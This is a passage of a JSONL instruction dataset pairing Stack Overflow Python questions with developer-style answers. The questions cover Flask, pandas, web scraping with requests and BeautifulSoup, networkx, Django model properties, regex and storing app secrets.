&quot;RuntimeDataConnector&quot;,\n            &quot;batch_identifiers&quot;: [&quot;default_identifier_name&quot;],\n        },\n        &quot;default_inferred_data_connector_name&quot;: {\n            &quot;class_name&quot;: &quot;InferredAssetSqlDataConnector&quot;,\n            &quot;include_schema_name&quot;: True,\n        },\n    },\n}\n\nyaml = YAML()\n\nyaml.dump(datasource_config, sys.stdout, transform=context.test_yaml_config)\n<\/code><\/pre>\n<p>I'll make a PR for great-excpectations to update their documentation\/use of <code>ruamel.yaml<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to alter Python function that causes TypeError in flask<p>I'm aware there are other questions in the same regard, but they didn't help me.<br>\nWhen I open my flask project and run it the first time I get an error:<\/p>\n<pre><code>TypeError: The view function did not return a valid response. The function either returned None or ended without a return statement.\n<\/code><\/pre>\n<p>If I delete this function, run flask, execute the rest of the python code from the index.html, paste the function back in and run it, everything works fine:<\/p>\n<pre><code>def select_zone():\n    \n    zones = request.form.get(&quot;select_zone&quot;)\n    if zones == &quot;Z1&quot;:\n        return open_zone1()\n\n    if zones == &quot;Z2&quot;:\n        return open_zone2()\n<\/code><\/pre>\n<p>In another post the solution was explained this way:<\/p>\n<blockquote>\n<p>The error indicates that the function is not complete because it\nmisses the return instruction. Any view function must return\nsomething.<\/p>\n<\/blockquote>\n<p>Well, my function returns something, just not the render_template, because I don't need it there. How can I work around this problem?<\/p>","output_text":"<p>If <code>zones<\/code> is another value (as described by Just learned it and Partick Artner in the comments), then the function will not return anything. Specifically, you say this error triggers when you open the <code>index.html<\/code>. This probably means that, since zones is a value from a dropdown, it is not included in the request.<\/p>\n<p>If a key is not found, <code>request.form.get()<\/code> returns None. Since you don't check for this value, there is no way for the <code>select_zone<\/code> function to return anything. I'd advise you to think about multiple scenario's here. I'll write them down in Python below.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from flask_api.status import HTTP_400_BAD_REQUEST\n\ndef select_zone():\n    zones = request.form.get(&quot;select_zone&quot;)\n    if zones is None:\n        # Zones not in request, what do you do? Throw an error,\n        # return all zones, or just return silently? For example:\n        # `return f&quot;Missing `select_zone` parameter&quot;, HTTP_400_BAD_REQUEST`\n        # returns a 400 (Bad Request) error\n\n    if zones == &quot;Z1&quot;:\n        return open_zone1()\n\n    if zones == &quot;Z2&quot;:\n        return open_zone2()\n\n    # Zones is not None, Z1 or Z2, thus it must be some other\n    # unforeseen value. This is probably where you need to throw\n    # an error.\n    return f&quot;Invalid zone {zones}&quot;, HTTP_400_BAD_REQUEST\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Mass calculate between dataframes and create new column<p>I have two dataframes (df1 and df2) with analogous metrics (MetricA\/MetricA1 and MetricB\/MetricB1). I want to calculate the delta between them in a third column in df1 (as shown conceptually in df3). What is the best way to do that without having to type each calc individually? Reprex below:<\/p>\n\n<pre><code>import pandas as pd\nimport numpy as np\ndf1=pd.DataFrame(np.random.randint(0,100,size=(15, 2)), columns=['MetricA', 'MetricB'])\ndf2=pd.DataFrame(np.random.randint(0,100,size=(15, 2)), columns=['MetricA1', 'MetricB1'])\ndf3=df2=pd.DataFrame(np.random.randint(0,100,size=(15, 4)), columns=['MetricA', 'MetricB','DeltaMetricAAndA1', 'DeltaMetricBAndB1'])\n<\/code><\/pre>","output_text":"<p>You can do a join:<\/p>\n\n<pre><code>df3 = df1.join(df1.sub(df2.values).add_prefix(\"Delta\"))\n<\/code><\/pre>\n\n<p>Output:<\/p>\n\n<pre><code>    MetricA  MetricB  DeltaMetricA  DeltaMetricB\n0        17       42           -49           -29\n1        20       48           -33           -21\n2        22       13           -14            -8\n3        97       53            57           -24\n4        84       10            -7           -39\n5        96       55            49           -22\n6        61       56            21           -22\n7        89       21            44           -66\n8        96       83            80            55\n9        25       14           -20           -53\n10       13       84           -53             6\n11       43        6            -3             6\n12       77       56            48            -7\n13       59       15           -16           -20\n14       24        9           -29           -84\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I assign a column in a csv file by python?<p>I have a CSV that I want to graph.<\/p>\n<p>However, to get this graph, I need to first assign a column to a list (or array) and then go on from there. I need to assign the first column to said list. In the said column, there are many repeats of the numbers 1 through 45 (so in code that would be <code>range(1,46)<\/code>).<\/p>\n<p>Currently, I have written this so far:<\/p>\n<pre><code>for weekly sales against Date \n    import matplotlib.pyplot as plt\n    import numpy as np\n    import pandas as pd\n    %matplotlib inline\n\na = []\n\nfor stn in range(1,46):\n    a.append(walmart[walmart.Store == stn])\n\nfor printval in range(1,46):\n    b = a[printval-1]\n<\/code><\/pre>\n<p><strong>NOTE:<\/strong> <code>walmart<\/code> (the value associated to the dataset) has already been read here by <code>pd.read_csv<\/code>. It works and an output has been made.<\/p>\n<p>I do not know what to do from here. I want to graph this as well based on the store.<\/p>\n<p>The data set can be found: <a href=\"https:\/\/www.kaggle.com\/divyajeetthakur\/walmart-sales-prediction\" rel=\"nofollow noreferrer\">https:\/\/www.kaggle.com\/divyajeetthakur\/walmart-sales-prediction<\/a><\/p>","output_text":"<p>I have found out what I need to do to get this to work. The following code describes my situation.<\/p>\n<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\n%matplotlib inline\n\na = []\n\nfor stn in range(1,46):\n    a.append(walmart[walmart.Store == stn])\n\nfor printval in range(1,46):\n    b = a[printval-1]\n    w = b[b.Store == printval]\n    ws = w[&quot;Weekly_Sales&quot;]\n    tp = w[&quot;Date&quot;]\n    plt.scatter(tp, ws)\n    plt.xlabel('Date')\n    plt.ylabel('Weekly Sales')\n    plt.title('Store_' + str(printval))\n    plt.savefig('Store_'+ str(printval) + '.png')   #To save the file if needed\n    plt.show()\n<\/code><\/pre>\n<p>Again, I have already imported the CSV file, and associated it to <code>walmart<\/code>. There was no error when doing that.<\/p>\n<p>Again, the dataset can be found in <a href=\"https:\/\/www.kaggle.com\/divyajeetthakur\/walmart-sales-prediction\" rel=\"nofollow noreferrer\">https:\/\/www.kaggle.com\/divyajeetthakur\/walmart-sales-prediction<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Post request with scrapy on homepage with ajax<p>I am trying to scrape the prices of various pharmacies on the site <a href=\"https:\/\/www.medizinfuchs.de\" rel=\"nofollow noreferrer\">https:\/\/www.medizinfuchs.de<\/a> for a specific drug (e.g., <a href=\"https:\/\/www.medizinfuchs.de\/preisvergleich\/aspirin-complex-beutel-20-st-bayer-vital-gmbh-pzn-4114918.html\" rel=\"nofollow noreferrer\">https:\/\/www.medizinfuchs.de\/preisvergleich\/aspirin-complex-beutel-20-st-bayer-vital-gmbh-pzn-4114918.html<\/a>).<\/p>\n<p>The page works with infinite scrolling that is called via a Load-more-button. Using the network analysis of the developer tools, I see that the page sends a post request to <a href=\"https:\/\/www.medizinfuchs.de\/ajax_apotheken\" rel=\"nofollow noreferrer\">https:\/\/www.medizinfuchs.de\/ajax_apotheken<\/a>, if I click this button.<br \/>\nIf I copy this post request as a cURL and then convert it with <em>curl2scrapy<\/em>, I get the following code:<\/p>\n<pre><code>from scrapy import Request\n\nurl = 'https:\/\/www.medizinfuchs.de\/ajax_apotheken&quot;'\n\nrequest = Request(\n    url=url,\n    method='POST',\n    dont_filter=True,\n)\n\nfetch(request)\n<\/code><\/pre>\n<p>The network analysis shows that the response to the post request is in HTML format (analogous to the homepage), but <strong>all<\/strong> pharmacies are listed there with their prices (not just barely ten pharmacies as on the homepage before I click the Load-more-button).<\/p>\n<p>My somewhat embarrassing question - I'am still an absolute beginner - is now how I integrate this post request into my previous python code so that all pharmacies are scanned and I get the price information for all pharmacies. My previous python code is:<\/p>\n<pre><code>import scrapy\n\nclass MedizinfuchsSpider(scrapy.Spider):\n    name = &quot;medizinfuchs&quot;\n    start_urls = [\n            'https:\/\/www.medizinfuchs.de\/preisvergleich\/aspirin-complex-beutel-20-st-bayer-vital-gmbh-pzn-4114918.html'\n        ]\n        \n    def parse(self, response):\n        for apotheke in response.css('div.apotheke'):\n            yield {\n                'name': apotheke.css('a.name::text').getall(),\n                'single': apotheke.css('div.single::text').getall(),\n                'shipping': apotheke.css('div.shipping::text').getall(),\n            }\n<\/code><\/pre>\n<p>I would be super grateful for support :-).<\/p>\n<p>Christian<\/p>","output_text":"<p>If you are open to suggestions using only requests and beautifulsoup, you can:<\/p>\n<ul>\n<li>use a <code>requests.Session()<\/code> to store cookies and perform a first call on the url <code>s.get(url)<\/code>. This will get the cookie <code>product_history<\/code> which is equal to the product id<\/li>\n<li>use <code>requests.post<\/code> to call the API you've spotted in the chrome dev tools, and also specify the <code>id<\/code> in the form data<\/li>\n<\/ul>\n<p>The following example iterates a list of products and perform the flow described above :<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import requests\nfrom bs4 import BeautifulSoup\nimport pandas as pd\n\nproducts = [\n    &quot;https:\/\/www.medizinfuchs.de\/preisvergleich\/aspirin-complex-beutel-20-st-bayer-vital-gmbh-pzn-4114918.html&quot;,\n    &quot;https:\/\/www.medizinfuchs.de\/preisvergleich\/alcohol-pads-b.braun-100-st-b.-braun-melsungen-ag-pzn-629703.html&quot;\n]\n\nresults = []\n\nfor url in products:\n    # get id\n    s = requests.Session()\n    r = s.get(url)\n    id = s.cookies.get_dict()[&quot;product_history&quot;]\n\n    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)\n    pzn = soup.find(&quot;li&quot;, {&quot;class&quot;: &quot;pzn&quot;}).text[5:]\n    print(f'pzn: {pzn}')\n\n    # make the call\n    r = requests.post(&quot;https:\/\/www.medizinfuchs.de\/ajax_apotheken&quot;,\n                      data={\n                          &quot;params[ppn]&quot;: id,\n                          &quot;params[entry_order]&quot;: &quot;single_asc&quot;,\n                          &quot;params[filter][rating]&quot;: &quot;&quot;,\n                          &quot;params[filter][country]&quot;: 7,\n                          &quot;params[filter][favorit]&quot;: 0,\n                          &quot;params[filter][products_from][de]&quot;: 0,\n                          &quot;params[filter][products_from][at]&quot;: 0,\n                          &quot;params[filter][send]&quot;: 1,\n                          &quot;params[limit]&quot;: 300,\n                          &quot;params[merkzettel_sel]&quot;: &quot;&quot;,\n                          &quot;params[merkzettel_reload]&quot;:  &quot;&quot;,\n                          &quot;params[apo_id]&quot;:  &quot;&quot;\n                      })\n    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)\n    data = [\n        {\n            &quot;name&quot;: t.find(&quot;a&quot;).text.strip(),\n            &quot;single&quot;: t.find(&quot;div&quot;, {&quot;class&quot;: &quot;single&quot;}).text.strip(),\n            &quot;shipping&quot;: t.find(&quot;div&quot;, {&quot;class&quot;: &quot;shipping&quot;}).text.strip().replace(&quot;\\t&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot; &quot;),\n        }\n        for t in soup.findAll(&quot;div&quot;, {&quot;class&quot;: &quot;apotheke&quot;})\n    ]\n    for t in data:\n        results.append({\n            &quot;pzn&quot;: pzn,\n            **t\n        })\ndf = pd.DataFrame(results)\ndf.to_csv('result.csv', index=False)\nprint(df)\n<\/code><\/pre>\n<p>repl.it: <a href=\"https:\/\/replit.com\/@bertrandmartel\/ScrapeMedicinFuchs\" rel=\"nofollow noreferrer\">https:\/\/replit.com\/@bertrandmartel\/ScrapeMedicinFuchs<\/a><\/p>\n<p>Note that in the solution above, I'm only using <code>requests.Session()<\/code> in order to get the <code>product_history<\/code> cookie. The session is not needed in subsequent calls. This way, I get directly the product id without having to use regex in the html\/js. But maybe there is a better way to get the product id, we can't get it from the url since it only has part of the product id <code>4114918<\/code> instead of <code>1104114918<\/code> (if you don't want to harcode the <code>110<\/code> suffix part)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Convert multirelational graphs to bipartite graphs with networkx<p>I have a multi-relational graph G (subject <code>s<\/code> and object <code>o<\/code> nodes connected with an edge having a predicate label <code>p<\/code>), made with <code>networkx.DiGraph<\/code>. Is there a way to easily and elegantly create its bipartite graph by replacing each labeled edge <code>(s, p, o)<\/code> with two unlabeled edges <code>{(s,p),(p,o)}<\/code>? This operation is also called Levi transformation (Levi, 1942) and is aimed to treat each entity and relation equally.<\/p>\n<p>Current graph construction example:<\/p>\n<pre><code>amr_graph = networkx.DiGraph()\n\nfor node_id, node_string in amr.nodes.items():\n   amr_graph.add_node(node_id, name=node_string)\n\nfor subj, pred, obj in amr.edges:\n   amr_graph.add_edge(subj, obj, key=pred)\n<\/code><\/pre>","output_text":"<p>Just create the new edges as you see fit:<\/p>\n<pre><code>import random\nimport networkx as nx\n\ns=[random.randint(0,2) for i in range(10)]\no=[random.randint(3,5) for i in range(10)]\np=[random.randint(6,8) for i in range(10)]\n\nG = nx.DiGraph()\nH = nx.DiGraph()\nF = nx.DiGraph()\n\n#split while constructing the orgiginal graph\nfor subj, pred, obj in zip(s,p,o):\n    G.add_edge(subj, obj, key= pred)\n\n    H.add_edge(subj, pred, key = obj)\n    H.add_edge(pred, obj, key= subj)\n               \n#use existing graph to split edges              \nfor subj, obj, d in G.edges(data=True):\n    pred = d['key']\n\n    F.add_edge(subj, pred, key = obj)\n    F.add_edge(pred, obj, key= subj)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n After performing arithmetic operations within a django model, how can I update the value of an integer in my model using the new value I obtained?<p>The code I have below was derived from this <a href=\"https:\/\/stackoverflow.com\/questions\/49905489\/django-how-to-perform-arithmetic-operations-in-a-class-in-models-py?noredirect=1&amp;lq=1\">Question<\/a><\/p>\n<pre><code>class CryptoData(models.Model):\n    currency = models.CharField(max_length=20, choices=currency_choices, default='BTC')\n    amount = models.IntegerField()\n    price_with_amount = 1\n\n\n    def calculate_price(self):\n        if self.currency == &quot;BTC&quot;:\n            currency_price = get_crypto_price(&quot;bitcoin&quot;)\n        elif self.currency == &quot;ETH&quot;:\n            currency_price = get_crypto_price(&quot;ethereum&quot;)\n        elif self.currency == &quot;UNI&quot;:\n            currency_price = get_crypto_price(&quot;uniswap&quot;)\n        elif self.currency == &quot;ADA&quot;:\n            currency_price = get_crypto_price(&quot;cardano&quot;)\n        elif self.currency == &quot;BAT&quot;:\n            currency_price = get_crypto_price(&quot;basic attention token&quot;)\n\n        price_with_amount = currency_price * self.amount\n\n        return price_with_amount\n\n    def save(self,*args,**kwargs):\n        self.price_with_amount = self.calculate_price()\n        super().save(*args, **kwargs)\n\n\n    class Meta:\n        verbose_name_plural = &quot;Crypto Data&quot;\n\n\n    def __str__(self):\n        return f'{self.currency}-{self.amount}-{self.price_with_amount}'\n\n<\/code><\/pre>\n<p>Basically, I want to multiply the user input, amount, by the price I obtain using my get_crypto_price function (I have confirmed that the get_crypto_price function works). After saving self.price_with_amount, I want to return it in my <strong>str<\/strong> method then pass it to my views.py to be used in my HTML. When I give price_with_amount a value of 1 for example, as I did in my code, it gets passed and works fine in my HTML. What I'm trying to do is change the value of price_with_amount to the obtained values in the method calculate_price. How can this be done while keeping the methods I currently have?<\/p>\n<p>Thanks :)<\/p>","output_text":"<p>If you <em>really<\/em> want to save it to the database, you could make the field a <code>models.FloatField<\/code> with the <code>editable=False<\/code> argument, so that it doesn't appear in the form for the user to edit. Then the rest of your code should work as is.<\/p>\n<p><em><strong>But...<\/strong><\/em><\/p>\n<p>Since <code>price_with_amount<\/code> is a dynamic value that's based on the current price, via the <code>get_crypto_price<\/code> function, it doesn't seem like a good idea to save it.<\/p>\n<p>Instead, you could calculate the value on-the-fly <a href=\"https:\/\/docs.python.org\/3\/library\/functions.html#property\" rel=\"nofollow noreferrer\">using a <code>@property<\/code><\/a>. A <code>property<\/code> is an instance method that you can use as if it were a regular attribute.<\/p>\n<p>Your code could be rewritten like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class CryptoData(models.Model):\n    currency = models.CharField(...)\n    amount = models.IntegerField()\n\n    ...\n\n    @property\n    def price_with_amount(self):\n        return self.calculate_price()\n\n    def __str__(self):\n        return f'{self.currency}-{self.amount}-{self.price_with_amount}'\n<\/code><\/pre>\n<p>With this implementation, you can always access the <code>price_with_amount<\/code> property on a <code>CryptoData<\/code> instance, and as long as it has the <code>currency<\/code> and <code>amount<\/code> values, it will show the value calculated on demand.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; crypto = CryptoData(currency=&quot;ETH&quot;, amount=10)\n&gt;&gt;&gt; crypto.price_with_amount\n22718.20\n&gt;&gt;&gt; crypto.save()\n\n# It still behaves as expected after fetching it from the db\n&gt;&gt;&gt; CryptoData.objects.get(id=crypto.id).price_with_amount\n22718.20\n\n# You can use the property just like you would a regular attribute\n&gt;&gt;&gt; if crypto.price_with_amount &gt; 1000:\n        print(&quot;foobar&quot;)\nfoobar\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to get data from span tag which have custom characteristics? (BeautifulSoup)<p>I have following span tag. How can I scrape <code>xuRMlBoIUcI7nAJktBcJvPByp1DLE4aPGzq3JNiRKsdNqUkVSJBY%2BggxRhp0GcRx4Gw4lWQxbTk%3D<\/code>\nwhich is assigned to data-slug?<\/p>\n<pre><code>    &lt;span data-ju-jspjrvxy=&quot;&quot; \n    data-slug=&quot;xuRMlBoIUcI7nAJktBcJvPByp1DLE4aPGzq3JNiRKsdNqUkVSJBY%2BggxRhp0GcRx4Gw4lWQxbTk%3D&quot; \n    data-gtm-clickedelement=&quot;CTA button&quot; data-gtm-offer=&quot;&quot; data-ju-wvxjoly-pk=&quot;303795&quot;\n data-gtm-voucher-id=&quot;303795&quot; class=&quot;businessinsiderus-voucher-button-holder clear&quot;&gt;\n\n        \n<\/code><\/pre>","output_text":"<p>If my understanding of your problem is correct you want to scrape an attribute of a tag.\nIf this is in fact your problem the following link will provide a solution:\n<a href=\"https:\/\/stackoverflow.com\/questions\/2612548\/extracting-an-attribute-value-with-beautifulsoup\">Extracting an attribute value with beautifulsoup<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Inverse Document to Document (List) in Python<p>I am analyzing some text from the Microsoft Academic API and I am looking to consume the paper abstracts, but the abstract are given in inverse-document format i.e. {word : [Indices of occurrence of word in the document]}. I need to convert this to regular document. I have around 20,000 abstracts like this and I came up with an approach as follows, where result is the api output.<\/p>\n<pre><code>doc_length = result['entities'][0]['IA']['IndexLength'] #provided in the api output variable - result\noutput_list = [0] * doc_length\ninv_doc = result['entities'][0]['IA']['InvertedIndex']\nfor key in inv_doc.keys():\n    for index in inv_doc[key]:\n        output_list[index] = key\n<\/code><\/pre>\n<p>The time complexity of the above approach is <code>O(N*M)<\/code> where N is the number of documents and M is the length of each document.<\/p>\n<p>My question is can I do better in terms of time complexity?<\/p>","output_text":"<h2>You cannot do better<\/h2>\n<p>At least as far as asymptotic complexity goes, your complexity is optimal. <code>O(NM)<\/code> is the size of the output. It is impossible to output something of size <code>O(NM)<\/code> any faster than <code>O(NM)<\/code> (unless the input is already part of the output, which is not the case here).<\/p>\n<p>To see this, consider that the output takes up <code>O(NM)<\/code> memory. To get the output, if nothing else, you will have to access all of that memory. This in itself already takes <code>O(NM)<\/code> time.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - Use regex to extract substrings between two markers<p>I have a problem that I need help with. I have the below strings and need to do the following:<\/p>\n<ol>\n<li>Extract all the substrings between the equal sign and &quot;END=STRING&quot;\nstring or closing double quotation mark.<\/li>\n<li>Group the extracted substrings into a single group<\/li>\n<li>Do not show the starting and ending markers in the output<\/li>\n<li>If possible, do not show the back slashes or newlines<\/li>\n<\/ol>\n<p>Two samples of extended result:<\/p>\n<pre><code>STRING database file 2025.01 ABC_ONE ABC_TWO\n\nSTRING database file 2025.01 ABC_ONE:12.3456 ABC_TWO:12.3456 ABC_THREE:12.3456 ABC_FOUR:12.3456 ABC_THREE:12.3456 ABC_FOUR:12.3456 ABC_FIVE:12.3456 ABC_SIX:12.3456 ABC_SEVEN:12.3456 ABC_EIGHT:12.3456 ABC_NINE:12.3456 ABC_TEN:12.3456\n<\/code><\/pre>\n<p>I will use Python re.finditer to loop through the results I get from regex. Also, re.MULTILINE and re.IGNORECASE will be used.<\/p>\n<p>Link to what I have on regex101: <a href=\"https:\/\/regex101.com\/r\/CwMaEZ\/1\" rel=\"nofollow noreferrer\">https:\/\/regex101.com\/r\/CwMaEZ\/1<\/a><\/p>\n<p>Feel free to suggest a different pattern but keep in mind the following:<\/p>\n<ol>\n<li>Groups are needed like how I show in my pattern.<\/li>\n<li>I want to iterate over the results in Python so I prefer re.finditer<\/li>\n<\/ol>\n<p>Here is the regex I have so far:<\/p>\n<pre><code>(STRING)\\s([a-zA-Z0-9\/+._-]+)\\s([a-zA-Z0-9\/+._-]+)\\s([a-zA-Z0-9\/+._-]+)\\s([a-zA-Z0-9\/+._-]+)?\\s?\\\\?\\n?(.*VALUE=\\s*\\&quot;?)\n<\/code><\/pre>\n<p>Here are the strings:<\/p>\n<pre><code>STRING database file 2025.01 \\\n     0123456789ABCD VALUE=&quot;ABC_ONE \\\n     ABC_TWO &quot; END=STRING\n     ST=\n\nSTRING database file 2025.01 \\\n     0123456789ABCD VALUE=ABC_ONE \\\n     ABC_TWO END=STRING\n     ST=\n\nSTRING database file 2025.01 ABCDEFGH123456 \\\n     VALUE=ABC_ONE ABC_TWO END=STRING \n\nSTRING database file 2025.01 \\\n    VALUE=ABC_ONE:12.3456 END=STRING \\\n    AAAA=ABCDEFGH1234\n\nSTRING database file 2025.01 \\\n    VALUE=&quot;ABC_ONE:12.3456 ABC_TWO:12.3456 \\\n    ABC_THREE:12.3456 ABC_FOUR:12.3456 &quot; \\\n    END=STRING \\\n\nSTRING database file 2025.01 \\\n    0123456789ABCD VALUE=&quot;ABC_ONE ABC_TWO &quot; \\\n    END=STRING \n\nSTRING database file 2025.01 VALUE=&quot;ABC_ONE \\\n    ABC_TWO ABC_THREE END=STRING\n\nSTRING database file 2025.01 \\\n    VALUE=&quot;ABC_ONE ABC_TWO ABC_THREE &quot; END=STRING\n\nSTRING database file 2025.01 VALUE=\n    &quot;ABC_ONE ABC_TWO ABC_THREE &quot; END=STRING \\\n\nSTRING database file 2025.01 VALUE=&quot;ABC_ONE \\\n    ABC_TWO ABC_THREE &quot; END=STRING\n\nSTRING database file 2025.01 VALUE=&quot;ABC_ONE ABC_TWO \\\n    ABC_THREE &quot; END=STRING\n\nSTRING database file 2025.01 VALUE=&quot;ABC_ONE ABC_TWO ABC_THREE &quot; \\\n\nSTRING database file 2025.01 \\\n    VALUE=&quot;ABC_ONE:12.3456 ABC_TWO:12.3456 \\\n    ABC_THREE:12.3456 ABC_FOUR:12.3456 \\\n    ABC_THREE:12.3456 ABC_FOUR:12.3456 \\\n    ABC_FIVE:12.3456 ABC_SIX:12.3456 \\\n    ABC_SEVEN:12.3456 ABC_EIGHT:12.3456 \\\n    ABC_NINE:12.3456 ABC_TEN:12.3456 \\\n    ABC_ELEVEN:12.3456 ABC_TWELVE:12.3456 \\\n    END=STRING\n<\/code><\/pre>","output_text":"<p>Firstly, you haven't really laid out the question neatly.<\/p>\n<p>But suggestion 1. is just use <code>\\S+<\/code> instead of <code>[a-zA-Z0-9\/+._-]<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n What should I do so that I can use a dictionary mapping the filter() function result?<p>I have a model like this:<\/p>\n<pre><code>class BNetworkEdge(models.Model):\n    id = models.AutoField(unique=True, primary_key=True)\n    source = models.IntegerField()\n    target = models.IntegerField()\n    edge_type = models.IntegerField()\n\n    class Meta:\n        managed = True\n        db_table = 'b_network_edge'\n<\/code><\/pre>\n<p>I have a dictionary like this:<\/p>\n<pre><code>{0:'direct', 1:'no-direct'}\n<\/code><\/pre>\n<p>I run this in python shell<\/p>\n<pre><code>&gt;&gt;&gt; BNetworkEdge.objects.filter()[0].edge_type\n0\n<\/code><\/pre>\n<p>How to get a result of 'direct' instead of '0'?<\/p>\n<p>Thanks!<\/p>","output_text":"<p>You can create a <a href=\"https:\/\/docs.python.org\/2\/library\/functions.html#property\" rel=\"nofollow noreferrer\">property<\/a> for this as,<\/p>\n<pre><code>@property\ndef edge_type_value(self):\n    _vals = {0:'direct', 1:'no-direct'}\n    return _vals[self.edge_type]\n<\/code><\/pre>\n<p>And your code is like,<\/p>\n<pre><code>from django.db import models\n\nclass BNetworkEdge(models.Model):\n    id = models.AutoField(unique=True, primary_key=True)\n    source = models.IntegerField()\n    target = models.IntegerField()\n    edge_type = models.IntegerField()\n\n    class Meta:\n        managed = True\n        db_table = 'b_network_edge'\n\n    @property\n    def edge_type_value(self):\n        _vals = {0:'direct', 1:'no-direct'}\n        return _vals[self.edge_type]\n<\/code><\/pre>\n<p>And you can access it as,<\/p>\n<pre><code>In [10]: BNetworkEdge.objects.filter()[0].edge_type_value\nOut[10]: 'direct'\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n loop through a dataframe with times and perform an operation if time is less than current time<p>Updated info 06.12.20:\nI am trying write a code where i loop through a dataframe and if an &quot;index_time&quot; is less than current time, then perform an operation, otherwise wait some time and loop again, until the end of the dataframe. the result of the code only works on the first row of the dataframe and then never finishes......<\/p>\n<p>Her is my input data example.<\/p>\n<pre><code>  time_interval     index_time  flag\n    10.0    1607279511.1    1\n    10.1    1607279521.2    1\n    14.0    1607279535.2    1\n    9.3     1607279544.5    1\n    12.7    1607279557.2    1\n    8.6     1607279565.8    1\n    12.0    1607279577.8    1\n    8.4     1607279586.2    1\n    11.8    1607279598.0    1\n    8.5     1607279606.5    1\n<\/code><\/pre>\n<p>Input data generation:<\/p>\n<pre><code>pd.set_option('display.float_format', lambda x: '%.1f' % x)\ndelay = [10.0,10.1,14,9.3,12.7,8.6,12.0,8.4,11.8,8.5]\ndf = pd.DataFrame(delay)\ndf = df.rename(columns = {0: 'time_interval'})\n\ntime_stamp = 0\ntime_stamp = time.time()\n    \nindex_time = []\nfor index, row in df.iterrows():\n    update = time_stamp+row['time_interval']\n    time_stamp = update\n    index_time.append(update)\n    \ndf['index_time'] = pd.DataFrame(index_time).astype(float)\ndf['flag'] = 1\n<\/code><\/pre>\n<p>My code:<\/p>\n<pre><code>i = 0\nsequence = True\nwhile sequence:\n    if df['index_time'][i] &gt; time.time():\n        time.sleep(1)\n    elif df['index_time'][i] &lt; time.time() and df['flag'][i] == 1:\n        df['flag'][i] = 2\n        print(&quot;index_time:&quot;,df['index_time'][i],&quot;flag:&quot;,df['flag'][i])\n    elif df['index_time'].max() &lt; time.time() and df['flag'][i] == 2:\n        break\n<\/code><\/pre>","output_text":"<p>For this particular requirement, loop is not required. Use <code>np.where<\/code> to find the index positions and then perform the operation on the index positions obtained.<\/p>\n<p>Try this:<\/p>\n<pre><code>id = df.index[np.where(df['index_time'] &lt; time.time())]\ndf.loc[id,'flag'] = 2\n<\/code><\/pre>\n<p><strong>Note:<\/strong>\nYou should not be using <code>iterrows()<\/code> to modify while iterating. Iterating is meant for reading and the iterator returns a copy of the original object (a view), thus the changes will not reflect on the original object.\nRead <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.iterrows.html\" rel=\"nofollow noreferrer\">doc<\/a><\/p>\n<p>If you really want to use loop, then try <code>df.apply<\/code> and perform operations. See below,<\/p>\n<pre><code>def func(x):\n    if x['index_time'] &lt;= time.time():\n        x['flag'] = 2\n    return x\ndf.apply(lambda x: func(x), axis=1)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Secrets storage in Python<p>Hi I'm new to flask programming, I see that flask has secret keys config and database URI config. I'm wondering if it is a good idea to create a Secrets class, in a new file called secret.py, to store secret keys and such (This file will be in git ignore obviously)<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class Secrets:\n    def __init__(self):\n        self.secret_key = &quot;secret_key&quot;\n        self.database_path = &quot;secret_path&quot;\n<\/code><\/pre>\n<p>and in my app.py file i will import it like this<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from secret import Secret\nsecret = Secret()\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = secret.database_path\napp.config['SECRET_KEY'] = secret.secret_key\n<\/code><\/pre>\n<p>Is what i propose a good idea or is it dumb,if its dumb pls tell me why.<\/p>","output_text":"<p>In your code above, there is no need to instantiate <code>Secret<\/code>, as you just access the class variables.<\/p>\n<p>Also, usually you create a <code>Config<\/code> class for Flask.<\/p>\n<p>The only sub-optimal thing about your code would be that you hardcode secrets in your code - this means, that when you push your code e.g. to GitHub others can see your credentials.<\/p>\n<p>Thatswhy usually environment variables are used to provide secrets for production.<\/p>\n<p>Have a look at Miguel Grinberg's great tutorial, especially this chapter:\n<a href=\"https:\/\/blog.miguelgrinberg.com\/post\/the-flask-mega-tutorial-part-xv-a-better-application-structure\" rel=\"nofollow 